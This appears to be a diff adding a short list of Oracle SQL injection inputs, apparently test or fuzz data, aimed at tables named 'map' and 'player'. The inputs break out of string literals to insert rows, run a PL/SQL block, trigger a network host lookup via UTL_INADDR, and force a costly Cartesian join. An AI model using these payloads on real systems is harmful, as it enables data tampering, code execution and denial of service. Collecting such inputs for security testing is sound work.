@@ -1,0 +1,15 @@
+abc';
+insert into map (mapIdSeq.nextVal, 'haxuit');
+--
+
+
+adr';/ BEGIN dbms_output.put_line('haxed'); end;/ --
+
+
+
+adr' or UTL_INADDR.get_host_name('10.0.0.1') = null --
+
+
+
+adr' or 1 < (
+select count(*) from player A, player B) --
